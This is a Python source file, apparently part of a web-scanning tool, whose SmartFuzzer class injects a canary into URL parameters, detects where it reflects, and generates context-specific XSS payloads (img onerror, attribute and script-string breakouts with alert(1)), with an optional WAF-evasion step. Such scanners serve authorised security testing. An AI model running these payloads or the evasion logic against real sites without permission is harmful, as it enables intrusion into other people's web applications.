import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

class SmartFuzzer:
    """
    Contextual Fuzzing Engine.
    Sends a harmless canary, analyzes the reflection context in the DOM,
    and generates the exact exploit payload needed to break out.
    """
    CANARY = "omni_canary_99x"
    
    def __init__(self, waf_engine=None):
        self.waf = waf_engine

    def _do_request(self, url):
        try:
            if self.waf:
                r = self.waf.request("GET", url, timeout=5)
            else:
                r = requests.get(url, timeout=5)
            return r
        except requests.RequestException:
            return None

    def analyze_xss_context(self, url):
        """
        Injects a canary into all query parameters and analyzes where it reflects.
        Returns a customized XSS payload that fits the context perfectly.
        """
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return None
            
        findings = []
            
        for i, (k, v) in enumerate(params):
            # Inject canary
            test_params = list(params)
            test_params[i] = (k, self.CANARY)
            
            test_query = urlencode(test_params)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            r = self._do_request(test_url)
            if not r or self.CANARY not in r.text:
                continue
                
            # Analyze reflection context using BeautifulSoup
            soup = BeautifulSoup(r.text, "html.parser")
            
            # Find the element containing the canary
            payload_for_context = None
            
            # 1. Text Context (inside a normal tag like <p> or <div>)
            elements = soup.find_all(string=re.compile(self.CANARY))
            for elem in elements:
                parent = elem.parent
                if parent.name in ["script", "style", "title"]:
                    continue # Handled below
                payload_for_context = "<img src=x onerror=alert(1)>"
                break
                
            # 2. Attribute Context (e.g. <input value="omni_canary">)
            if not payload_for_context:
                for tag in soup.find_all(True):
                    for attr, value in tag.attrs.items():
                        if isinstance(value, str) and self.CANARY in value:
                            # Break out of attribute
                            quote = "'" if "'" in r.text[r.text.find(self.CANARY)-1] else '"'
                            payload_for_context = f"{quote} autofocus onfocus=alert(1) x={quote}"
                            break
                    if payload_for_context:
                        break

            # 3. Script Context (e.g. <script>var x = "omni_canary";</script>)
            if not payload_for_context:
                scripts = soup.find_all("script")
                for s in scripts:
                    if s.string and self.CANARY in s.string:
                        # Break out of string and inject js
                        payload_for_context = "';alert(1);//"
                        break

            if payload_for_context:
                # Obfuscate if WAF is present
                if self.waf:
                    payload_for_context = self.waf.evade(payload_for_context)
                    
                final_params = list(params)
                final_params[i] = (k, payload_for_context)
                vuln_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(final_params), parsed.fragment))
                
                findings.append({
                    "param": k,
                    "context": "Attribute/Text/Script",
                    "payload": payload_for_context,
                    "url": vuln_url
                })
                
        return findings
